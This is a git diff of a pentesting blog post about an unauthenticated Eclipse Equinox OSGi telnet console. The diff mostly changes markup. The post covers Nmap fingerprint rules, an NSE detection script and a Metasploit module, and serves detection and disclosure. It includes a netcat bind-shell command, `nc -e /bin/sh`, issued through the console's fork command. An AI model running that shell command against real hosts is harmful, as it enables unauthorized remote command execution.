@@ -2,10 +2,13 @@
 layout: post
 title:  "OSGi Console - Gateway to (s)hell"
 date:   2018-02-13 10:00:00
+author: qkaiser
+image: /assets/shodan_osgi.png
+excerpt: |
+    I recently came upon a Telnet-based service that was previously unidentified by network scanning tools. This blog post describes my encounter with this service and how I used Nmap fingerprinting and scripting capabilities to add detection, and Metasploit to gain command execution on it.
 comments: true
 categories: pentesting
 ---
-
 
 I recently came upon a Telnet-based service that was previously unidentified by network scanning tools. This blog post describes my encounter with this service and how I used Nmap fingerprinting and scripting capabilities to add detection, and Metasploit to gain command execution on it.
 
@@ -13,8 +16,8 @@ I recently came upon a Telnet-based service that was previously unidentified by 
 
 My first encounter with this service was from a Nessus scan reporting a Telnet service on some remote host. I simply connected to it:
 
-<pre>
-<b>telnet somehost.lan</b>
+```
+telnet somehost.lan
 Trying somehost.lan...
 Connected to somehost.lan.
 Escape character is '^]'.
@@ -31,24 +34,24 @@ osgi> help
 close - shutdown and exit
    scope: equinox
 --snip--
-</pre>
+```
 
 Interesting. A few minutes of google-fu later, I found some page describing that this service is an [Eclipse Equinoxe OSGi console](https://www.eclipse.org/equinox/documents/quickstart-framework.php). I also found out that this OSGi console was used to dynamically load and execute Java based bundles such as [IBM Websphere Extremescale](https://www.ibm.com/support/knowledgecenter/en/SSTVLU_8.6.0/com.ibm.websphere.extremescale.doc/txsinstallstartplugs.html).
 
 So far so good. I tinkered with the console and found two interesting calls:
 
-<pre>
-osgi> <b>help exec</b>
+```
+osgi> help exec
 exec - execute a command in a separate process and wait
    scope: equinox
    parameters:
         String   command to be executed
-osgi> <b>help fork</b>
+osgi> help fork
 fork - execute a command in a separate process
     scope: equinox
     parameters:
         String   command to be executed
-</pre>
+```
 
 Hosts were not hardened and netcat was already installed, so a simple `fork "nc -e /bin/sh 4444"` and my bind shell was there. This could have been the end of the story but I wanted to add detection capabilities for this service to Nmap so we could detect it easily during future tests.
 
@@ -59,7 +62,7 @@ My first step was to create a test environment on my own machine so I don't end 
 
 Unzip everything and create the following directory structure by copying the right jar files from the unzipped directory:
 
-<pre>
+```
 .
 ├── configuration
 │   └── config.ini
@@ -69,7 +72,7 @@ Unzip everything and create the following directory structure by copying the rig
 ├── org.eclipse.equinox.console.jar
 ├── org.eclipse.osgi_3.12.50.v20170928-1321.jar
 └── plugins
-</pre>
+```
 
 The configuration file should contain the following entries:
 
@@ -80,9 +83,9 @@ osgi.noShutdown=true
 {% endhighlight %}
 
 Once everything was in place, I checked that it actually worked by launching it:
-<pre>
-<b>java -jar org.eclipse.osgi_3.12.50.v20170928-1321.jar -console 5555</b>
-</pre>
+```
+java -jar org.eclipse.osgi_3.12.50.v20170928-1321.jar -console 5555
+```
 
 For those who want to follow along, you can download an install script gist I wrote. It's available at [https://gist.github.com/QKaiser/66c8a618eef2a7801c0bbb1aa43d724a](https://gist.github.com/QKaiser/66c8a618eef2a7801c0bbb1aa43d724a)
 
@@ -117,8 +120,8 @@ match telnet m|^\xff\xfb\x01\xff\xfb\x03\xff\xfd\x1f\xff\xfd\x18$| p/Eclipse Equ
 
 Next attempt: it works \o/
 
-<pre>
-<b>$ nmap -sV -p5555 -Pn 127.0.0.1</b>
+```
+$ nmap -sV -p5555 -Pn 127.0.0.1
 
 Starting Nmap 7.00 ( https://nmap.org ) at 2018-01-29 18:30 CET
 Nmap scan report for localhost.localdomain (127.0.0.1)
@@ -127,14 +130,14 @@ PORT     STATE SERVICE VERSION
 <p style="color:yellow">5555/tcp open  telnet  Eclipse Equinoxe OSGi Shell (direct mode)</p>
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 0.53 seconds
-</pre>
+```
 
 I later discovered that OSGi console can run in what they call "_telnetd mode_". This can be done by issuing the following command:
 
-<pre>
-osgi> <b>telnetd start</b>
+```
+osgi> telnetd start
 telnetd is running on 127.0.0.1:2019
-</pre>
+```
 
 When connecting to the service over the _telnetd mode_ port, IAC negotiation of terminal type is not enforced and we are greeted with `osgi>` automagically. I therefore kept both matching rules:
 
@@ -145,8 +148,8 @@ match telnet m|^(\r\n)*osgi>\x20$| p/Eclipse Equinoxe OSGi Shell (telnetd mode)/
 
 Again, a quick check with Nmap to demonstrate that it actually works:
 
-<pre>
-<b>$ nmap -sV -p2019,5555 -Pn 127.0.0.1</b>
+```
+$ nmap -sV -p2019,5555 -Pn 127.0.0.1
 
 Starting Nmap 7.00 ( https://nmap.org ) at 2018-01-29 18:36 CET
 Nmap scan report for localhost.localdomain (127.0.0.1)
@@ -156,7 +159,7 @@ PORT     STATE SERVICE VERSION
 5555/tcp open  telnet  Eclipse Equinoxe OSGi Shell (direct mode)</p>
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 0.64 seconds
-</pre>
+```
 
 
 ### Writing an NSE Script
@@ -305,8 +308,8 @@ end
 
 That's it. Let's try it:
 
-<pre>
-<b>$ nmap -sV -p 5555 --script osgi-info -Pn -n 127.0.0.1</b>
+```
+$ nmap -sV -p 5555 --script osgi-info -Pn -n 127.0.0.1
 Starting Nmap 7.00 ( https://nmap.org ) at 2018-01-30 21:37 CET
 Nmap scan report for 127.0.0.1
 Host is up (0.00015s latency).
@@ -319,7 +322,7 @@ PORT     STATE SERVICE VERSION
 |_  Java VM: 25.101-b13 (Java HotSpot(TM) 64-Bit Server VM)</p>
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 0.58 seconds
-</pre>
+```
 
 Yay ! I'm keeping an eye on pull requests [#1123](https://github.com/nmap/nmap/pull/1123) and [#1124](https://github.com/nmap/nmap/pull/1124), hopefully my code will be included in Nmap at some point :)
 
@@ -336,7 +339,8 @@ Thanks to the wonderful people maintaining Metasploit, my module [landed](https:
 
 If you search for the terms "osgi" and "eclipse" on shodan, you get [23 results](https://www.shodan.io/search?query=osgi+eclipse). Please make sure you're not in charge of one of them.
 
-![shodan]({{site.url}}assets/shodan_osgi.png)
+{:.foo}
+![shodan]({{site.url}}/assets/shodan_osgi.png)
 
 
 ### Conclusion
